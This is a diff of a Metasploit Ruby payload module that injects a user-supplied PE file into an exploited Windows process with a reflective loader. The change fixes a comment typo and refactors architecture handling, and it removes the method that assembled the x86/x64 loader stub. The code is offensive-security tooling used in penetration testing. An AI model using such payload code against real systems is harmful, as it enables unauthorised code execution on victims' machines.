@@ -8,13 +8,10 @@ module Msf
 
   ###
   #
-  # Reflective PE  module injects a custom native PE file into the exploited process using a relective PE loader stub
+  # Reflective PE  module injects a custom native PE file into the exploited process using a reflective PE loader stub
   #
   ###
-
   module Payload::Windows::PEInject
-    include Msf::Payload::Windows::ReflectivePELoader
-    include Msf::Payload::Windows::ReflectivePELoader_x64
     def initialize(info = {})
       super
       register_options([OptPath.new('PE', [ true, 'The local path to the PE file to upload' ]),], self.class)
@@ -45,9 +42,9 @@ module Msf
         return
       end
       print_status('Premapping PE file...')
-      mapped_pe = create_pe_memory_map(data, arch_to_s)
+      mapped_pe = create_pe_memory_map(data)
       print_status("Mapped PE size #{mapped_pe.length}")
-      p = encapsulate_reflective_stub(mapped_pe, arch_to_s)
+      p = encapsulate_reflective_stub(mapped_pe)
       print_status("Uploading reflective PE (#{p.length} bytes)...")
       # Send the size of the thing we're transferring
       conn.put([ p.length ].pack('V'))
@@ -57,26 +54,9 @@ module Msf
       conn.close
     end
 
-    def encapsulate_reflective_stub(mapped_pe, arch)
-      call_size = mapped_pe.length + 5
-      reflective_loader = ''
-      if arch.eql?('x86')
-        reflective_loader = Metasm::Shellcode.assemble(Metasm::X86.new, "cld\ncall $+#{call_size}").encode_string
-        reflective_loader += mapped_pe
-        reflective_loader += Metasm::Shellcode.assemble(Metasm::X86.new, asm_reflective_pe_loader).encode_string
-      elsif arch.eql?('x64')
-        reflective_loader = Metasm::Shellcode.assemble(Metasm::X64.new, "cld\ncall $+#{call_size}").encode_string
-        reflective_loader += mapped_pe
-        reflective_loader += Metasm::Shellcode.assemble(Metasm::X64.new, asm_reflective_pe_loader_x64).encode_string
-      else
-        raise ArgumentError, "Unsupported architecture: #{arch}"
-      end
-      reflective_loader
-    end
-
-    def create_pe_memory_map(file, arch)
+    def create_pe_memory_map(file)
       pe = Rex::PeParsey::Pe.new(Rex::ImageSource::Memory.new(file))
-      unless (arch.eql?('x86') && pe.ptr_32?) || (arch.eql?('x64') && pe.ptr_64?)
+      unless (arch.first == ARCH_X86 && pe.ptr_32?) || (arch.first == ARCH_X64 && pe.ptr_64?)
         raise ArgumentError, "Selected PE file is not #{arch_to_s}"
       end
 
